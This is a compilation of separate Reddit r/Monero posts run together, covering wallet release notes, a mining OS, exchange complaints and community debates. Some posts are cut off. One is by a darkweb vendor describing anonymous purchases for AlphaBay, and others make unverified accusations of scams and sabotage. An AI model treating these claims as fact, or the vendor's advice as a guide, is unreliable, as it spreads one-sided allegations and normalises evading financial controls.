~~dc0191c0f6793afdec2ad7a089f91b7681197b239020384404b9fbc784cafd2b pickaxe-master-2018.10.05-x86\_64.iso~~

Slight deviations in each ISO build lead to differing checksums, preventing their prediction. See [the corresponding comment](https://www.reddit.com/r/Monero/comments/9ck3l8/want_a_moneroonly_mining_os/e7ih64r) for an explanation.

Note that the software is in **experimental** condition. There are known issues. The most prominent is that for now(!) **nothing is persisted**. You have to re-enter your pool details and wallet address and restart the mining process after every boot.

If you don't, you can still run and test Pickaxe Linux, but your entire hash rate will be donated to the project. (Thank you :)

Have fun!

&#x200B;

**UPDATE 2018-09-18  -  Infrastructure set up**

My initial objective was to release sometime in October. Your positive feedback motivated me to switch up gears and make this distribution a reality as fast as possible. News:

* The entire evolution of the system's setup is now checked into Git in a clean manner. As promised, it's based on an Arch Linux image. This means that those who want to verify the development will have an easy time doing so, given they trust Arch, that is.
* A mining proxy for directing the fees to the corresponding developers is set up[\*](https://www.reddit.com/r/Monero/comments/9ck3l8/want_a_moneroonly_mining_os/e66oj3p). I am currently looking into getting a continuous hash rate donation to the xmr-stak team.
* Following Kovri's example, I chose to host sources with Gitlab, finding some particularly useful features that GitHub does not offer.
* Since there were no objections to the name, the distribution will most likely keep its current one: **Pickaxe Linux**
* As a little surprise, I added a special build variant tailored for the privacy fanatics among you. Details in a future update;

Up next is deciding on a hosting for the binary builds (feel free to suggest) and then we can jump right into some testing with a first experimental release.

&#x200B;

**UPDATE 2018-09-04  -  Building clean Git history started**

I've started to build a clean commit history on top of a current Arch Linux base. This simplifies later audits. I'm about a third through, setting up external infrastructure as I progress. Will now answer the open questions in this thread;"
"Hello everybody,

i noticed that there are many projects that need to be funded, and I would think that there would be more involvement at the individual level to make monero a top 3 coin. 

i dont understand any code, 0, nadda, but based on the XMR Research Lab's work I am very impressed. We need to be supporting them more, because all their hard work comes back to us in the form of better private digital cash. 

it is a little dishartening to see that projects are only being supported by 44 people on avereage since our community is made up of tens of thousands if not hundreds of thousands. this means on average (for the project of xmr research lab), each person donated like 7.5 monero, wow)

I do not have much, but I still give 0.1 Monero to the xmr research lab guys and I encourage everyone to do so as well if u can afford it: https://forum.getmonero.org/8/funding-required/89004/funding-for-surae-at-mrl-for-q1-2018

it may seem trivial to only donate such a small amount, but in the end the total will equal more than the sum of its parts.

these gentlemen take on a lot of work and accept monero for it. if they believe enough in spending quarter after quarter and accepting monero for their work, we should believe in them by donating even just a tiny fraction of our holdings to them and support their work.

hope everyone is having a good day :)

""Thats just the point of the iceberg.

Its taken ours a long time to destroy the Monero Wikipedia page despite that in its prime it was getting 1000 2000 hits each day.  

A twelve month program of information destruction has been incredibly successful. Just a little bit of sabotage here and there week in week out deleting large texts.

These days whenever someone looks at the Wikipedia entry they leave the experience with the psychological takeaway that Monero is poor and crap.

This is how we managed to destroy the incoming community, and by the end of the year our plan will be complete.""

"First and foremost, you can download them from here:

https://getmonero.org/downloads/

Note that these binaries include a fix for the [erroneous embedded version](https://i.imgur.com/2igxz1f.png) stuff. In addition, upgrading is quite straightforward and is done as follows. 

1. Download the new binaries from [here](https://getmonero.org/downloads/).

2. Extract the new binaries to a new directory of your liking.

3. Open `monero-wallet-gui`^1. It should automatically load your ""old"" wallet and you should be set for the upcoming scheduled protocol upgrade. Moreover, to clarify, you *don't* need to move your funds. 

(1) On Linux you ought to start the GUI with the `start-gui.sh` script.

"I was contacting the support of Pornhub the other day and was asking them if they'd thought about adding Monero as an accepted payment method. She pointed me to their feedback and suggestions system and mentioned that there's already a request for adding Monero up since January.

"I've been looking to understand the landscape for private e-mail services, and so far it doesn't seem like they actually exist, mostly due to merchants not accepting Monero.

Thinking like somebody desperately seeking private communications (say, a political dissident), I tried to set up an email account that would be anonymous and also not be subject to seizure (encryption at rest).  I fired up Tor Browser and connected first to ProtonMail, as it's well-known in the space.   I didn't provide a recovery address, and it insisted that I validate via SMS or to make a small payment because, it said, that Tor is known to be a spammer conduit.  Fine - I selected the payment option and was presented with only the choice of Paypal or Credit Card.  So Proton requires some kind of personally-identifyable information (IP, email, phone, credit card, or Paypal) to even create an account.  I filed a bug more than a month ago asking then to add Monero, but they haven't (at least yet) and it sure looks like they want something to tie to your account for tracking.

Failing there, I had heard that Lavabit was back in business and I wouldn't mine spending some money with Ladar, so I connected there over Tor.  There I didn't get any complaints about Tor and spammers but that's possibly because they don't offer a free service generally.   So I clicked on the $30/yr option and got exactly one choice: credit card payment.

Taking a look at the merchants page on getmonero I didn't see anybody specializing in secure email (though I didn't research every hosting company listed there).

The purpose of my post is threefold:
1. Be aware that famous sites purporting to offer email privacy really want to know who you are, which can only cost them profit (at least directly).
2. If somebody here knows somebody there and 1. is actually false,  please explain to them there why Monero payments are required for privacy.
3. If there actually is such a private email service out there that I missed, please share it here in a comment so we can all benefit.

"I don't just use Monero, I use several of the top cryptocurrencies. I don't just hodl either, I trade, accumulate and spend crypto. I use it in the real world every day. 

Out of all of them, Monero just... works. And it works a hundred times better than the others in my opinion. As money anyway.

Monero is the first wallet to be synced and ready to go. My other wallets are usually still synchronizing while I'm shutting Monero down having finished with it.

Monero is not THE cheapest, but it's damn near. Others I use (not wanting to fud anything so no names mentioned, but.. you know), are so expensive that it is  literally unfeasible to consider using them day to day.

Monero is also not THE fastest, but again, it's god damn close. It is approved and ready to use long before others. Some, take so long, that I start to worry that it's gone wrong somehow. In fact, coupled with other facts, Monero is the fastest all round. Were you to 'race' a Monero transaction with another cryptocurrency, from software start through wallet sync, making a transaction, shutting down the software, and the transaction approved an ready to spend, Monero wins every time.

So I just want to thank Monero, as a user of crypto currency on a daily basis, for doing it's job and doing it well. If any newbies read this, as there is probably an influx of them coming, I know Monero looks daunting, but ALL crypto is at first. It's a million times easier to use now, compared to just last year as big companies pop up and adopt it in the mainstream. Crypto is still in its early years, and no currency is completely ironed out. But Monero is the golden child in my opinion. Every day, it makes my life easier, while others stress me out, irritate me, and let me down. So if you're new to this, stick with it. If you are involved in any way with development or implementation, thank you very much. "

"With the network hash finally settling at a 75% reduction the XMR April 6th protocol upgrade was a RAVING success for all of us.  Again hat's off to the DEV Team.  I'm such big fan I posted the following post and got hammered.  Comments like ""What about the other 99,990 people that own ASICs!""  Really?  There has not been one Cryptonight ASIC sold to the public that I know of... man-o-man there's a lot of people there living in a small world.  Did I do wrong with the post below?  You tell me???!!!
---------------
I'm not sure how many of you out there on this forum are ""miners"" or even care--but this is important.

Decentralization is the heart and soul of the crypto movement. Centralization means anyone or thing--typically a ""government"" in command or control. Well for the Crypto space it looks like there a lot more to it than what meets the eye.

The entire crypto movement is enabled by ""mining"" which are the computing processes that run the networks. Way back when that was ""individuals"" using their own PCs to keep Bitcoin (and now all the other coins) well--an individual statement.

ASICs are specialized chipsets that basically just ""mine"". They are very efficient and extremely fast. As much as 100x faster than a PC with a GPU card. Massive farms have sprung up by industrial backers to extract profits. I'm ok with free markets--and that is the way it goes. BUT--no one really knew how much or how many ""ASICs"" were out there... well now we know. Monero just recently changed the algo for mining the network on April 6th. The entire amount of global computing power on the network has been reduced by 80%--EIGHTY PERCENT. So whether it is government(s) or large scale industrial actors--there remains a war on the individual. 

Huge hats' off to the Monero Dev team for fighting for the little guy. If you are not aware about mining and the tremendous contribution it makes to all things crypto I would encourage you to learn more....

I would encourage everyone in the Cryptospace to fight for decentralization--because in the end it does affect you.

If you are ASIC Farm, well, looks like you just got punched in the nose by the little guy!

"Hi all

After our initial post, we are pleased to announce the next step of Monero integration in ledger device.
The application specification is available in our github (https://github.com/LedgerHQ/blue-app-monero/blob/master/doc/blue-app-monero.rst) and the Monero project has been forked here : https://github.com/cslashm/monero

As we know that ""Soon™"" is not a correct answer to ""when?"", we plan an initial alpha code for the end of September.
Until then, do not hesitate to comment the specification on github.

I had buy orders at 0.015; all got filled. Going to sleep calm.
"I'm a darkweb vendor and a small time XMR investor. Our team fills about 200 orders per week on alphabay and we get about 1 XMR payment every 3-4 weeks if we're lucky.

We try to encourage Monero use. Our customers tell us that it's too hard to buy. They are typically spending between $50 and $200 with us. Small time stuff for buyers, so convenience outweighs privacy - especially when they find out that they still have to buy BTC. More and more are complaining about the BTC transaction fees. It's a real headache for them. They would jump across to XMR in the blink of an eye if you could buy it on localbitcoins.com (where they buy BTC completely anonymously). LBC does not have any KYC rules and no AML stuff to worry about. It makes it very easy to buy BTC and send it to alphabay without anyone knowing who you are. The only danger to them is if their VPN should disclose their IP address, but that risk is insignificant.

So..... what we'd like to see is an LBC clone for Monero. I know there are a couple of sites that have set up. Like moneroforcash.com and I forget the other one. But there's (almost) nobody actually selling monero there. 

So in summary: If you want to see XMR explode, please get out there and offer some for sale in a way that makes it easy for buyers. That means quick and easy transactions around the $200 mark, For cash.

And lastly: I have never come across a buyer interested in speculating in either BTC or XMR. They just want in and out as quickly as possible so they avoid losing money due to volatility."
"I’ve been following this project for several years. I have watched every presentation about Monero and read every article I can get my hands on. I enjoy the Monero project and the community so much that I spend most of my free time contributing, and I have worked hard to build communities across Europe. I have the deepest respect for the contributors who spend their time working on Monero. Nevertheless, I am disappointed by the announcement from Riccardo Spagni last night.

To people who have somehow avoided the recent news, Riccardo recently announced a “[MAJOR Monero announcement” on Twitter]( https://twitter.com/fluffyponyza/status/867073641179078656) that would happen during the New York Monero Symposium. As many people that spend time in the Monero community expected, it ended up [being a hoax](http://mea.business/). The markets reacted by climbing and falling before/after the event.

I understand the reasons Riccardo did this from his perspective. In fact, [he laid them out to us]( https://twitter.com/fluffyponyza/status/867514780617236480). I agree with the points he is trying to make. He doesn’t want people to use Monero with the primary motive of making money, and he doesn’t want to be treated as the CEO of Monero (which he isn’t, /u/gemeinsam).

Now getting in to the other side of the story. I personally view the situation as Riccardo using his position to prove a point. This was a very expensive point to prove, and I’m not just talking about the price movement. **Riccardo purposefully attempted to manipulate the price of a project that he has an official role in to prove a point he personally wanted to make.** I think this action is unacceptable, regardless of the points that came across. News of the event consumed his Twitter and this subreddit, and word passed on to several other communities as well. Few of these conversations are positive. I know Riccardo makes it one of his personal missions to battle FUD, but in this case, he caused a lot of it.

No member of the core team should attempt to sway the price of Monero for any reason, even if it’s a prank. If Monero is supposed to be used by some people, and people trust (for better or worse) that the contributors to the project will not abuse their influence. Riccardo did exactly what he hates other projects for doing: using manipulation to fight manipulation. I don’t think this was a good idea. Maybe the Consensus organizers were correct omitting Riccardo from the privacy panel, since I think this reaction is unprofessional. He could have made his point in a variety of other ways that could have ended without polarizing the community. Instead, he chose to go this route.

I haven’t even gotten into the potential for insider trading yet. Riccardo [denies having done this]( https://twitter.com/fluffyponyza/status/867521619081793536), though this is definitely a major concern. Many people will continue to hold this over Riccardo and this community’s heads. If anyone with an official position in the project abuses their influence to make money, they should lose this position immediately.

I get that Riccardo is tired of being called the “leader of Monero”. But even if the position holds little meaningful weight, his influence on the project certainly does. It is Riccardo’s responsibility to be conscious of his influence before taking any actions. If he wants to continue using Monero as a platform to spread his ideas, please delegate the public speaking tasks to someone else. No one is forcing Riccardo to stay involved in the project in his position. Up to this point, he has done a great job spreading the word of Monero at conferences and events, which is why I was in a bit of shock last night. I hope he avoids all irrational decisions like this one in the future and apologizes for this one.

Some people have said that he “[transferred power from himself to other XMR contributors]( https://www.reddit.com/r/Monero/comments/6d79j6/what_fluffy_has_done_is_to_essentially_transfer/)”, or that “[he sacrificed himself for the greater good]( https://www.reddit.com/r/Monero/comments/6d79j6/what_fluffy_has_done_is_to_essentially_transfer/di0n0bj/).” Even in such a case, why did he feel he needed to do it in this way? He could have stopped speaking at public events, he could have taken a sabbatical from his role, or he could have published an opinion piece about trust on the Monero website. I think there were several options on the table that would have the same effect without going nuclear. I understand that decentralization in a project is important, but think if this action is even a remotely good way to achieve that. I don’t think so.

I think in summary, this one quote I found from /u/AbstractStateMachine on /r/xmrtrader summarizes it all:

> I've never said anything bad about FP before today, in fact I've always found his antics to be amusing. However, before yesterday he's never once deliberately obscured the truth and pumped the price by tweeting about some big announcement. His ""unique"" approach may have hurt the community in ways we don't yet understand. This was an unnecessary action and out of character for him. It's unethical and absurd to claim that this is par for the course with him. People will still pump coins regardless."

"MARCH 16, 2018 - Bitmain, the world's largest Bitcoin ASIC manufacturer, stunned cryptocurrency investors by announcing that the company is launching a doorstopper business.

""While cryptocurrency mining is certainly a profitable endeavor, Bitmain sees opportunities in other sectors as well,"" Bitmain said in an official press release Friday. ""The high-end doorstopper market is one in which Bitmain can make a real difference.""

At the same time as the press release, Bitmain began accepting pre-orders for the Antminer X3, the first product in its new doorstopper series. The Antminer X3 sold out in seconds, at a cost of $12,000 apiece.

When asked why a doorstopper had the word ""miner"" in its name, Jihan Wu, the CEO of Bitmain, stated that ""The Antminer X3 looks, works and sounds like a cryptocurrency miner. It even has a built-in 550 watt heater that hashes an obsolete algorithm."" 

Wu justified his business decision by citing a precedent: ""Electroneum built a fake miner, why can't we?""

Bitmain refused to comment on whether or not they will be launching Monero Cash."

# Upgrading

You ought to perform the following steps:  

1. Download the new binaries (the `.zip` file (Windows) or the `tar.bz2` file (Mac OS X and Linux)) from aforementioned download links. 

2. Extract the new binaries to a new directory / folder of your liking. This is the easiest and recommended way. Alternatively, you can overwrite the old binaries.

3. Copy the wallet files (i.e. `<wallet-name>.keys`, `<wallet-name>`, and `<wallet-name>.address.txt`) to the new (i.e. v0.12.3.0) directory / folder. 

4. Start `monerod` and `monero-wallet-cli` (in case you have to use your wallet). 

Note that a blockchain resync is **not** needed, i.e., it will simply pick up where it left off.  

-------------------

# Brief release notes

The following critical bugs that were present in CLI v0.12.2.0 are fixed in CLI v0.12.3.0:

- The time-out issue (i.e. wallet not able to connect to daemon upon creating a transaction or wallet disconnecting during wallet refresh (with either a remote node or a local node))

In addition to aforementioned salient bug fixes, there are a lot of small bug fixes and improvements. 

**Note that, on Linux, you may have to apply this guide:**

[monerod v0.12.2.0 does not start on Linux because of “./monerod: error while loading shared libraries: libpcsclite.so.1”](https://monero.stackexchange.com/questions/8597/monerod-v0-12-2-0-does-not-start-on-linux-because-of-monerod-error-while-loa/)

[How do I generate a Ledger Monero wallet with the CLI (monero-wallet-cli)?](https://monero.stackexchange.com/questions/8503/how-do-i-generate-a-ledger-monero-wallet-with-the-cli-monero-wallet-cli/8504#8504)
"
"Hello folks,

I recently posted a thread about the random junk I found in some of X Wallet's transactions, but there's an even worse red flag that must be discussed (in addition to the extremely bad transaction construction, of ringsize 7 with three outputs.)

We may be looking at something even worse than we suspected. I don't make accusations like this very easily, but this right here is a scam. Not only an intentional attack on the privacy of the network, a *full-on scam.*

The source code that was released is ***FAKE AS HELL.*** I compiled the app and sideloaded it to my phone using Xcode, and then I examined the source code that was posted. Tons of functions are blanked out.

I loaded a wallet, 42kmZBqNN5ncKwCUsFLMPJEyMoUfeULufHGaTKna7vFs6ZHbgAQKnb4DnYYbJCUuakKGssBdk2negFxhqjWSFfLqBuUH2Ai, into X Wallet's standalone app from the App Store, and into a sideloaded version of the app. The viewkey is  cb893a805a30f49fec2527f8cd76e2b04f8b797976d2753591a8f4a9622fe702 and the address contains exactly 0.1 XMR. This is the donation address I posted for my [Monero Observer article](http://monero-observer.com/Monero%20Observer%20-%20Vol%2001%20No%2020.html) a while back.

Anyways, this address synced properly on the standalone app, but even after an hour of sitting, nothing ever happened on the self-compiled app - not even when I set the daemon address to na.node.moneroworld.com:18089, which is a valid remote node. This is a pretty strong indication that we are looking at incomplete source code. 

This is also an indication that the author of the app is a dishonest scammer trying to deceive the Monero community, because when you release the source code, you release the goddamn source code. You *do not* release a redacted version, and you *do not* release a modified version. You release *exactly* what you submitted to the Apple App Store, with no ifs, ands or buts.

Lastly, take a look at `Constants.swift`. [Right here.](https://imgur.com/a/Oo44n) Straight from the source code, no changes.

Why are the node address, fee wallet address, and fee amount deleted? Do you have something to hide, /u/xmr-rusticbison? Or are you just trying to scam the Monero community?

Why is `mixinCount` 5, which would lead to a ring-size of 6, when it is known *FOR CERTAIN* that X Wallet uses a ring-size of 7?

Why is `defaultTransactionPriority` low, when it is known *FOR CERTAIN* that X Wallet uses normal transaction priority?

This is a clear indication that either (a) Justin has released an old version of the source code, for unknown reasons, or (b) he has clearly and intentionally made modifications to the released source code to cover something up.

Why have you made these changes to the source code that you released, Justin? Did you think that we wouldn't notice your changes?

Explain yourself, or be branded a scammer by this community. The choice is yours, /u/xmr-rusticbison."
"I'm doing my master thesis in applied cryptography (due next summer) and I'd like to spend this time on Monero as I think it is one of the most important privacy software projects at hand. I currently do some digging on cryptographic tools required for second layer protocols for off-chain transactions (similar to Lightning) on top of Cryptonote, but I don't know if this is of any interest or priority for the community.

So, if there are any specific cryptographic research directions apart of those in MRL reports and feasible for a one-person project, I would really appreciate your suggestions."
"# **Overview**

This is the next major release of Monero. It adds an initial release of RingCT, which is already live on testnet. The RingCT whitepaper [can be found here](https://lab.getmonero.org/pubs/MRL-0005.pdf). Note that the v4 hard fork has been moved to the beginning of January, 2017, although the v5 hard fork remains set at September, 2017. This is to enable early availability of RingCT transactions on the Monero network, although they will not be enforced as the only possible transaction type until the v5 hard fork.

One of the largest pieces of work were the BlockchainDB performance improvements. This was largely done by warptangent, an early Monero contributor who passed away in March, 2016. His work was completed by Howard ""hyc"" Chu, and we have named this release after him. We are deeply grateful for all the effort he put in to making Monero what it is today.

Some highlights of this release are:

* major performance improvements, especially on spinning disks

* major space saving gains for the blockchain, despite the performance improvements

* renamed binaries to follow a more logical, consistent convention

* RingCT...obviously:)

* added libunwind support for better crash reporting

* added a key image export and import function for full watch-only wallet functionality

* added support for ARMv8 processors

* added a do_not_relay flag for transactions sent to the daemon

* added a sweep_all command and RPC call for the wallet

* significant fixes and improvements to threading

* add a get_transfers RPC call

* added transfer tracking to the wallet (lost forever if the wallet cache is deleted)

* added a filter_by_height option to get_transfers

* added a --max-concurrency flag for the wallet

* major improvements to ARM performance, especially on newer 64-bit chips

* huge overhaul of cmake and the readme

* added a wallet API for the GUI

* added a fee multiplier and reduced fees

* made monero-wallet-cli more robust when handling corrupt caches

* prompt twice for a wallet password to avoid password issues

* improved daemon 'status' details, including time to the next fork

* more bug fixes than you can shake a stick at

* temporary patch (via a predefined user-agent) for the CSRF attack against monero-wallet-cli's RPC API, as disclosed by Henry Hoggard

##**Updating: Blockchain Conversion**

Due to the space savings and performance gains it is again highly recommended that you delete the contents of your Monero working directory and sync from scratch. This directory can be found in ~/.bitmonero on Linux and OS X, and on Windows in \Users\username\AppData\Roaming\bitmonero or \ProgramData\bitmonero.

Alternatively, you can use monero-blockchain-export to export your current blockchain, then delete the lmdb folder in your working directory, and finally use monero-blockchain-import to reimport it.

##**Updating: Wallet Files**

Simply create a new directory with the 0.10 binaries and copy your wallet files over to there. Make sure to backup your wallet files properly. If you need any help, feel free to PM me or respond in this thread. Note that your wallet contains three files, namely wallet.bin.keys (this is the most important file, since it contains your keys), wallet.bin (this is the wallet cache, which contains your transaction history and private tx keys), and wallet.address (which is just your public address). In addition, if you incur a bug whilst upgrading, you can always restore your wallet with the mnemonic seed as follows:

For Mac and Linux:

`./monero-wallet-cli --restore-deterministic-wallet`

On Windows make sure to launch it from the command line. Go to the folder monero-cli-wallet is located and make sure your cursor isn't located on any of the files. Subsequently do SHIFT + right click and it will give you an option to ""Open command window here"". Lastly, type the following command:

`monero-wallet-cli.exe --restore-deterministic-wallet`

Note that simplewallet was renamed to monero-wallet-cli in v0.10.0.

##**General Hardfork Information**

Information about the upcoming hardfork, which will take place on the 21st of September, and subsequent hardforks can be found [here](https://www.reddit.com/r/Monero/comments/50tngy/general_information_for_the_upcoming_hardforks/). The main thing to know is that you should either be running version 0.9.4 or 0.10.0. Otherwise, you will get booted off the network. If you are mining, make sure the pool you are mining on is splitting the coinbase outputs into proper denominations. 


##**GUI Update**

To quote u/fluffyponyza:

>I mentioned off-handedly that I'd try build it on various platforms after the next tagged release.




"
"XMR-Stak donation pool statistics show that only 25% of the miners are running a version that is compatible the new fork.

You **need** to update, otherwise you will be **banned** from your pool when the fork happens!

--- edit

Due to a lot of people asking here is where you can get newest xmr-stak (miner made by my team) : https://github.com/fireice-uk/xmr-stak/releases

Xmr-stak-cpu, xmr-stak-amd or xmr-stak-nvidia **will not work**"
"You don’t need to take my word for it, take it straight from the horses mouth (/u/changelly_com):

“Once again, our risk management system may put on hold some suspicious transactions and the security department is working hard in order to process such operations in minimum time. When a customer refuses to provide the required data, we cannot simply return coins as we wouldn't like to operate and transfer coins that might be potentially stolen or raised by fraud.”

Translation: If Changelly randomly says they “suspect” you of stealing or fraud” (how could they know, the whole point of Monero is that it’s untraceable), they’ll steal your Monero. Stealing to prevent stealing - GENIUS. Why didn’t I think of that scam?

Officer: “Sir the car you are driving is stolen.”

Changelly: “Yes I know but the guy driving it before me couldn’t prove it was never used in a crime. I can’t just return it, it might have been used in a crime!”

"#**Monero v0.10.3.1 - Wolfram Warptangent - release**

First and foremost, please upgrade to this version. A blockchain resync is *not* needed. Only this version will work after the fork of April 15. 

## Overview

This is a necessary point release of Monero v0.10 ""_Wolfram Warptangent_"", and it is a mandatory update due to the April 15th hard fork, which in turn has been necessitated by the unexpectedly high adoption rate of RingCT transactions necessitating a modification of the dynamic block size limiter algorithm.

In addition, this is the first version that aligns CLI and GUI tags, with the CLI being tagged and released first, and the GUI tagged and released within a few days thereafter. This will mean that some point releases in future may be forced by a need on the GUI side, where the CLI may not have substantial changes, and vice versa.

Since it has only been 30 days since the last release, this is something of a ""light"" update. Nonetheless, some highlights of this release are:

- the 0.10.3.1 point release disables a portion of the server-side hash cache that was preventing a small subset of nodes from syncing
- added a feature to allow for multiple outputs to be paid to the same address (unless you have ```set merge-destinations 1```)
- fixed a major bug that could lead to some peers, seemingly randomly, getting stuck at a block height and refusing to accept further blocks
- monero-wallet-cli (and underlying libraries) can now work in a number of units: monero, millinero, micronero, nanonero, piconero
- added OpenAlias support to wallet RPC calls
- fixed hardcoded seed fallback issues when DNS seeds have failed or too few seeds are returned
- added an optional config file for wallets
- added an additional non-interactive foreground mode for the daemon
- added mnemonic wordlists for French and Dutch
- per-kb fee quantized to 8 decimal places
- added a password function to monero-wallet-cli to allow for a wallet password to be changed (and all files re-encrypted)
- added a cache on the wallet to avoid re-scanning mempool txs already scanned
- improvements to auto-update functionality, including a download-and-verify mechanism
- fixes to a number of logs shown in the daemon by default
- massive API changes to support new features in the GUI
- as always, loads of bug fixes and performance improvements

##Updating: Wallet Files

Simply create a new directory with the 0.10.3.1 binaries and copy your wallet files over to there. Make sure to backup your wallet files properly. If you need any help, feel free to PM me or respond in this thread. Note that your wallet contains three files, namely wallet.keys (this is the most important file, since it contains your keys), wallet (this is the wallet cache, which contains your transaction history and private tx keys), and wallet.address (which is just your public address). In addition, if you incur a bug whilst upgrading, you can always restore your wallet with the mnemonic seed as follows:

For Mac and Linux:

`./monero-wallet-cli --restore-deterministic-wallet`

On Windows make sure to launch it from the command line. Go to the folder monero-cli-wallet is located and make sure your cursor isn't located on any of the files. Subsequently do SHIFT + right click and it will give you an option to ""Open command window here"". Lastly, type the following command:

`monero-wallet-cli.exe --restore-deterministic-wallet`

If you want to restore from the private keys instead of the mnemonic seed, replace `--restore-deterministic-wallet` with `--generate-from-keys`.

Alternatively, it could be that your wallet cache is incompatible and thus is causing issues. Instructions on how to delete the wallet can be found [here](https://monero.stackexchange.com/questions/3122/how-do-i-delete-the-wallet-cache/3123).

#**Monero GUI Beta 2 Release**

First and foremost, please upgrade to this version. A blockchain resync is *not* needed. Only this version of the GUI will work after the fork of April 15. 

## Overview

The second beta of the Monero GUI has been released. Due to our focus on completing the features required for the initial release we have not, as yet, completed support for 32-bit Windows, FreeBSD, DragonflyBSD, ARMv7 Linux, and ARMv8 Linux devices. Whilst these are being worked on, it may not be feasible to support some environments (like 32-bit Windows) due to performance degradation.

Download links are at the bottom of this post, and please take note of the known issues and caveats listed below.

To upgrade, just replace your existing GUI with this newer release. Beta 1 wallets will continue to work in beta 2, without any changes required from your side.

## Known Issues

- If the GUI doesn't start on Windows, or starts with a blank screen, then try launch it using the ```start-low-graphics-mode.bat``` batch file.
- The unsigned transaction format, used by cold wallets, may cause issues when moving between platforms (eg. from Linux to Windows) for signing.
- Cold transaction signing does not work with split transactions (sends that are split over multiple transactions).

##Updating: Wallet Files

Simply create a new directory with the GUI Beta 2 binaries. You don't need to copy over any wallet files, as the GUI Beta 2 should be able to open wallet files created by the GUI beta 1. If, however, you incur a bug whilst upgrading, you can always restore your wallet with the mnemonic seed. On the second page of the wizard you'll find an option to do so. 

Alternatively, it could be that your wallet cache is incompatible and thus is causing issues. Instructions on how to delete the wallet can be found [here](https://monero.stackexchange.com/questions/3122/how-do-i-delete-the-wallet-cache/3123). "
"After a scenario I [described 2 weeks ago](https://www.reddit.com/r/Monero/comments/72ks6k/ive_dumped_my_gold_and_silver_its_just_monero_now/), I was really angry. This became my new personal wealth allocation:

* 99% Monero
* 1% bank account / debit card

I just watched this great video:

"For the past few days changelly has implemented new draconian KYC and AML rules that extort users into sending personal information or lose their money (good profit for changelly). There are posts all over reddit about this

Not only do they not allow you to cancel your transaction (like XAPO etc all over exchanges) after you send in your documents it will take weeks if not forever for verification. This is 100% money grabbing scheme.

PS: They do not warn users about the document requirements before you do the transaction

EDIT 1: 

Changelly said this:
""We value our customers’ anonymity, so we ask for KYC only if the transaction is detected as suspicious. Besides, the user will see the warning about transaction being subject for KYC check before the final step of the transaction. We are transparent and straightforward about our intentions.""

The support team are very misinformed, there is no warning whatsoever and I invite you all to check for yourself. I created multiple new orders with very high amounts, no warning. This is a blatant lie.

Update (6 days later): Still holding my money. Told me there's no way to get it back without sending my personal information. Confirmed they are targeting monero and XEM specifically. This company has gone rogue and should be avoided at all costs. /r/monero has active warnings out on them and they have a long history of scamming people, I should of read up on this before trying to do business with them. Good profit for them I suppose."
"I have just used Monerujo on my Android for the first time and it's great. It works just as easily and smoothly as any mobile wallet I have seen for any other cryptocurrency, including bitcoin. It only takes a few seconds to connect to the remote node, and you can start using right away. The interface is simple and intuitive, it's dummy-proof, and the app is open-source. It seems like we have basically taken care of the the Android mobile wallet with Monerujo, and most people have Androids, which means most crypto users can now use a high quality, secure, and open-source Monero wallet on their smart phone. As if that wasn't enough, it has XMR.TO integrated, just for some icing on the cake.

When Monerujo was first released and announced, there wasn't that much hype on this subreddit. Posts from the devs didn't get as many upvotes as one would expect for something so important, though back then I think it was because people were still skeptical about it because the app was not done by the core team. However, it has been a long time since then and as far as I know there have been no issues. Has anyone from the core team or any other long-time respected community member officialy reviewed the code? 

I'm just trying to figure out why this gem of an app still doesn't seem to get the attention or appreciation that it merits, at least based on my experience with it so far. Perhaps people are only really mainly concerned with the hardware wallet? I dno. 

Anyway, I just wanted to say that from my experience so far Monerujo is awesome, I'd like to thank u/m2049r for his great work on this.

"Hey Monero Community, Anthony from Jaxx here. 

I wanted to take this time to provide another update on the progress of our Monero integration. 

We targeted early November for the release... but failed. We hate not making our timing targets, it really sucks. Learning from the experiences, working towards better estimations, and hitting projections is something we'll consistently improve on. That being said, Monero integration has been a bitch. We're breaking new grounds here as we work to (and will) deliver a means for you to manage / send / receive XMR on 9 platforms with you in control of the keys... all done via a single backup phrase that can be used to derive the keys to all your digital currencies. You will also be able to buy / sell XMR directly in Jaxx via Shapeshift.

Here's where we stand on the integration. Fernando & Augusto (two of out token integration leads) have spent 80 hours doing the initial research, gaining an understanding of Monero transactions and developing the Monero client-side library. Fluffypony has been a great help and we truly thank him for his assistance. The library is 90% complete and should be ready this Monday. Because we missed our launch target, we decided to increase our Monero dev efforts and have reassigned resources to work on the required back-end infrastructure that can start as the library comes to completion. This part of the project is expected to take 40 hours (5 days) and will be worked on by another integration team member Ismael. Concurrently, Augusto will be working on general integration (expected 3 days), and also be responsible for testing and bug-fixing the back-end (expected 2 days). Once Augusto and Fernando have completed their work, it all gets sent to our CTO Chris and her front / middle (end) team for final tie-ins and implementation into Jaxx. This usually takes 1-2 days. Monero UI / UX assets have already been competed by Rahul and are waiting to be integrated by Chris' team. When this is all completed, it can be packaged, tested, and we can hit the release button.

The new estimated release date is the week of November 21st. I'll be pushing our entire team towards making the target. Please know that Monero is receiving 90% of our token integration resources and it is the priority for us. If it made sense to put 100% on the project we would, however, somethings just can't be moved faster with more resources due to required linear processes.

I'll ensure to keep everyone updated over the next many days. 

Cheers!

"[RandomX](https://github.com/tevador/RandomX) is a proof-of-work algorithm that aims to achieve longer-term ASIC resistance than the current CryptoNight-based tweaks. It was created more than 3 months ago as the successor of the original RandomJS idea. While development is still ongoing, I'm not expecting any major changes to the concept.

&#x200B;

I have finished basic documentation that covers most of the features of RandomX. It's available on [github](https://github.com/tevador/RandomX). Preliminary performance numbers are included.

&#x200B;

The purpose of this post is to assess if the community and especially miners would accept RandomX being implemented in Monero.

&#x200B;

Most notable disadvantages of RandomX:

* GPU mining would no longer be possible. RandomX is CPU-only.
* The portable hash verification is slower than CryptoNight at the moment, roughly 50 ms, but some optimizations are possible and a non-portable verification mode is available with just 2-4 ms verification time (this is mainly for pools).
* A community funded audit would be needed because it's a much larger change than just a tweak.

Please post any questions or concerns in the comments or create a github issue.

"With the market dropping it can feed into emotions and scare people. It can lead people to second guess themselves and wonder “is this crypto thing even going to last?” “Is Monero really even valuable?” During this phase of the market’s development volatility is inevitable, but if you keep your eye on the future it won’t feel so much like a gamble. Let us all remember that:
- Monero developers strive to create and maintain a product that can secure someone’s life savings, that can protect people who fear for their lives, and that can allow for sound transactions with all the features of real money.
- Monero has one of the most talented and productive communities in existence.... and it’s completely decentralized with projects and workgroups that all work toward making Monero even better
